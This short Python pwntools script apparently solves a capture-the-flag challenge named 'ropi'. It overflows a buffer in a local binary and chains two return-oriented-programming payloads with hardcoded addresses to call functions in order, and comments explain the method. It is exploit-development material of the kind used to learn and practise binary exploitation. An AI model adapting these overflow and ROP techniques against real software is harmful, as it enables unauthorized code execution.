from pwn import *

def main():
  ret = 0x08048500
  ori = 0x08048590
  pro = 0x08048640
  ezy = 0x080486a0

  # We want to call ret, then ori, then pro
  # But we can't do it in one rop chain because
  # the first argument for ori also needs to be
  # the address of pro

  # so instead we re-call ezy to ask for user input
  # again, which allows us to use a second rop chain to finish

  p = process('./ropi')
  print p.readline()
  print p.readline()
  p.sendline("A" * 40 + "B"*8 + p32(ret) + p32(ezy) + p32(0xbadbeef))
  print p.readline()
  print p.readline()
  p.sendline("A" * 40 + "B"*8 + p32(ori) + p32(pro) + p32(0xabcdefff));
  print p.recvall()

if __name__ == '__main__':
  main()
